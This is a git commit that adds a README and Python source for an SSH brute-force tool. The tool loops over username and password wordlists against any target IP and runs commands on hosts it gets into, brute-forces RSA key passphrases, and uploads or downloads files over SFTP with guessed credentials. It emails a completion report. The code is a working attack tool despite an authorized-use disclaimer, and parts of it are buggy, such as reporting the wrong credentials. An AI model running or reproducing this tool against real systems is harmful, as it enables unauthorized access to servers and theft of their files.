5ce9f167e11602c8b27c66359482bb4d901389b1
符玄 <3072252442@qq.com>
2024-08-28 00:49:33 +0800

    Add files via upload

---
+++ README.md
@@ -0,0 +1,56 @@
+<p align="center"><img src="https://www.png8.com/imgs/2022/04/14/71834c40d72793ff.png" /></p>
+<h1 align="center">W01f-ssh-crack</h1>  
+<div align="center">一款综合性的ssh爆破工具，支持任意IP，不需要电脑里面事先存有key</div>
+
+# :sunny:声明
+
+1. 该项目仅供授权下使用，禁止使用该项目进行违法操作，否则自行承担后果，请各位遵守《中华人民共和国网络安全法》！！！
+2. 在此非常感谢[刘江的博客教程](https://www.liujiangblog.com/)，他的简洁易懂的文字让我快速了解了如何用paramiko实现Python内的ssh功能，具体文章地址：https://www.liujiangblog.com/blog/15/ 。
+3. 在写程序的过程中，我也参考了官方的一些文档资料，在https://docs.paramiko.org/en/stable/api/client.html 中我了解了`set_missing_host_key_policy(paramiko.WarningPolicy())`这个方法，可以让我实现不需要本地有`key`就可以连接对方的`ssh`（只用账号密码登录的时候），这一点我写完之后看其他人的代码的时候并没有发现。
+
+# :foggy:如何使用：
+
+1. 先填写`data.conf`，参数说明：
+  
+  | 参数  | 说明  |
+  | --- | --- |
+  | `sender` | 发送人的QQ邮箱，例如`xxxxxx@qq.com` |
+  | `pw` | 在`https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=1001256`可以查看，注意填写的是授权码，不是QQ邮箱密码。 |
+  | `receivers` | 接收人的QQ邮箱，例如`xxxxxxxx@qq.com` |
+  
+
+2. 本程序的`1.0`版本提供了三种选择，分别是`-C`、`-R`、`-T`：
+  
+  | 参数  | 说明  |
+  | --- | --- |
+  | `-C` | 采用`sshclient`+账号密码的方式登录（爆破账号密码） |
+  | `-R` | 采用`sshclient`+公钥秘钥的方式登录（爆破密码） |
+  | `-T` | 采用`sftp`上传、下载文件（爆破账号密码） |
+  
+
+3. 本程序提供两个参数：
+  
+
+        ①以上的三种选择三选一；
+
+        ②IP地址。
+
+        使用示例为：
+
+```python
+python W01f-ssh-crack.py -C 192.168.137.150
+```
+
+4. 须确保您的`data.conf`、`W01f-ssh-crack.py`、`username.txt`、`password.txt`在同一目录下。
+
+5. 目前已写好的代码里面邮件发送功能只支持`QQ`邮箱，您也可以自行改成其他的，如`smtp.gmail.com`、端口`587`，详情请参考网上的教程。
+
+6. 在爆破的过程中，由于使用了`set_missing_host_key_policy(paramiko.WarningPolicy())`这个方法，会导致大量的错误显示，但是这并不会影响结果，请耐心等待最终的输出结果即可。
+
+7. 如果您在使用中遇到任何问题，您有两种途径可以反馈：
+  
+    ①mailto:[sharecat2022@gmail.com](mailto:sharecat2022@gmail.com)
+  
+    ②https://github.com/W01fh4cker/W01f-ssh-crack/issues  
+# :milky_way:结果展示  
+![示意图](https://github.com/W01fh4cker/W01f-ssh-crack/blob/main/example.png)
---
+++ sshcrack.py
@@ -0,0 +1,219 @@
+# -*- coding: utf-8
+
+import paramiko
+import sys
+import smtplib
+import socket
+import argparse
+import os
+import configparser
+import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.header import Header
+from typing import Callable
+
+print("""
+@Author: W01f
+@repo: https://github.com/W01fh4cker/W01f-ssh-crack/
+@version: 1.0
+@time: 2022/4/13
+██╗    ██╗ ██████╗ ██╗     ███████╗      ███████╗███████╗██╗  ██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
+██║    ██║██╔═══██╗██║     ██╔════╝      ██╔════╝██╔════╝██║  ██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
+██║ █╗ ██║██║   ██║██║     █████╗  █████╗███████╗███████╗███████║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
+██║███╗██║██║   ██║██║     ██╔══╝  ╚════╝╚════██║╚════██║██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
+╚███╔███╔╝╚██████╔╝███████╗██║           ███████║███████║██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
+ ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝           ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+                                                                                                               
+""")
+
+# re coding and fixing bugs by: [KOKOMI12345]Fuxuan(https://github.com/KOKOMI12345)
+
+
+def parseArgs() -> tuple[str, str , str, int]:
+    parser = argparse.ArgumentParser(description='SSH Brute-Force Cracking Tool')
+    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans")
+    parser.add_argument('--stmpPath', type=str, default='data.conf', help="配置文件路径")
+    parser.add_argument('--hostname', type=str, default='127.0.0.1', help="目标主机IP地址")
+    parser.add_argument('--port', type=int, default=22, help="目标主机SSH端口")
+    args = parser.parse_args()
+    return args.mode , args.stmpPath, args.hostname, args.port
+
+def getConfig(section: str, key: str, stmpPathConf: str) -> str:
+    config = configparser.ConfigParser()
+    config.read(stmpPathConf)
+    return config.get(section, key)
+
+def sshClientConnection(hostname:str, SSHport: int):
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
+    with open("username.txt", 'r', encoding='utf-8') as f:
+        user_name = f.readlines()
+    with open("password.txt", 'r', encoding='utf-8') as f:
+        pass_word = f.readlines()
+    for username in user_name:
+        for password in pass_word:
+            try:
+                ssh_client.connect(hostname, port=SSHport, username=str(username), password=str(password))
+                stdin, stdout, stderr = ssh_client.exec_command('whoami',timeout=10)
+                print(stdout.read().decode('utf-8'))
+                ssh_client.close()
+            except Exception:
+                pass
+    print(fr"[√]SSH连接成功! 账号: {username} 密码为：{password}")
+
+def sshRsaConnection(hostname: str, SSHport: int):
+    id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
+    flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
+    if(flag1 == 'y'):
+        with open("username.txt", 'r', encoding='utf-8') as f:
+            user_name = f.readlines()
+        with open("password.txt", 'r', encoding='utf-8') as f:
+            pass_word = f.readlines()
+        for Rsa_password in pass_word:
+            for username in user_name:
+                try:
+                    local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa', password=str(Rsa_password))
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
+                    ssh.connect(hostname,
+                                port=SSHport,
+                                username=username,
+                                pkey=local_key)
+                    stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
+                    print(stdout.read().decode())
+                    ssh.close()
+                except Exception:
+                    pass
+        print(fr"[√]SSH连接成功! 账号：{username} 密码为：{Rsa_password}")
+    elif(flag1 == 'n'):
+        with open("username.txt", 'r', encoding='utf-8') as f:
+            user_name = f.readlines()
+        for m in user_name:
+            local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa')
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
+            ssh.connect(hostname,
+                        port=22,
+                        username=m,
+                        pkey=local_key)
+            stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
+            print(stdout.read().decode())
+            ssh.close()
+        print("[√]SSH连接成功！账号：" + str(m))
+    else:
+        print("您的输入有误！")
+
+def transFile(hostname: str, SSHport: int):
+    with open("username.txt", 'r', encoding='utf-8') as f:
+        user_name = f.readlines()
+    with open("password.txt", 'r', encoding='utf-8') as f:
+        pass_word = f.readlines()
+    flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2。")
+    if(flag2==1):
+        global p,q
+        for username in user_name:
+            for password in pass_word:
+                try:
+                    parameter = (hostname, SSHport)
+                    trans = paramiko.Transport(parameter)
+                    trans.connect(username=username, password=password)
+                    sftp = paramiko.SFTPClient.from_transport(trans)
+                    local_path = input("请输入您要上传的本地文件的绝对路径：")
+                    remote_path = input("请输入您要上传的位置的绝对路径：")
+                    try:
+                        sftp.put(localpath=local_path, remotepath=remote_path)
+                        trans.close()
+                        print("[√]上传成功！")
+                    except Exception:
+                        print("[×]上传失败。")
+                except Exception:
+                    pass
+        print("[√]连接成功！账号：" + str(p) + " 密码为：" + str(q))
+    elif(flag2==2):
+        for username in user_name:
+            for password in pass_word:
+                try:
+                    parameter = (hostname, SSHport)
+                    trans = paramiko.Transport(parameter)
+                    trans.connect(username=username, password=password)
+                    sftp = paramiko.SFTPClient.from_transport(trans)
+                    local_path = input("请输入您要保存的位置的绝对路径：")
+                    remote_path = input("请输入您要获取的文件的绝对路径：")
+                    try:
+                        sftp.get(localpath=local_path, remotepath=remote_path)
+                        print("[√]下载成功！")
+                        trans.close()
+                    except Exception:
+                        print("[×]下载失败。")
+                        trans.close()
+                except Exception:
+                    pass
+    else:
+        print("您的输入有误！")
+
+def send_msg():
+    server = "smtp.qq.com"
+    port = 465
+    sender = getConfig("data", "sender")
+    pw = getConfig("data", "pw")
+    receivers = getConfig("data", "receivers")
+    machine_name = socket.gethostname()
+    msg_root = MIMEMultipart('mixed')
+    msg_root['From'] = Header(f'{machine_name} <{sender}>')
+    msg_root['Subject'] = Header(f'Message from {machine_name}', 'utf-8')
+    mail_msg = f"""
+	<html>
+	  <body>
+	  <p>[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]<br>
+		 Message from {machine_name}</p>
+	<p>Path: {os.getcwd()}<br>
+	   Args: {' '.join(sys.argv)}</p>
+       您的扫描任务已经完成，如果觉得本软件还不错的话请给个star，谢谢您！
+       仓库地址：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack
+       有任何问题、建议，可以联系邮箱sharecat2022@gmail.com或者直接在github上面提出issues，地址为：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack/issues。感谢您的每一个建议！祝您生活愉快！                               From W01fh4cker
+	</body>
+	</html>"""
+
+    msg_root.attach(MIMEText(mail_msg, 'html', 'utf-8'))
+
+    smtp = smtplib.SMTP_SSL(server, port)
+    smtp.login(sender, pw)
+    smtp.sendmail(sender, receivers, msg_root.as_string())
+    print("[√]发送成功")
+    smtp.quit()
+
+if __name__ == '__main__':
+
+    def print_successmsg():
+        Success_Message = "连接成功！"
+        print(Success_Message)
+
+    def print_errormsg():
+        IfError_Message = "请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！"
+        print(IfError_Message)
+
+    modeDict: dict[str, tuple[Callable]] = {
+        'client': (sshClientConnection, send_msg),
+        'rsa': (sshRsaConnection, send_msg, print_successmsg),
+        'trans': (transFile, send_msg),
+        'default': (print)
+    }
+
+    mode, stmpPath, hostname, SSHport = parseArgs()
+
+    if mode not in modeDict:
+        modeDict['default'](f"模式{mode}不存在！")
+    else:
+        try:
+            if mode == "default":
+                print("请指定模式！")
+                exit(1)
+            modeDict[mode][0](hostname, SSHport)
+            if len(modeDict[mode]) > 1:
+                modeDict[mode][1]()
+            if len(modeDict[mode]) > 2:
+                modeDict[mode][2]()
+        except Exception as e:
+            print_errormsg()
+            print(e)
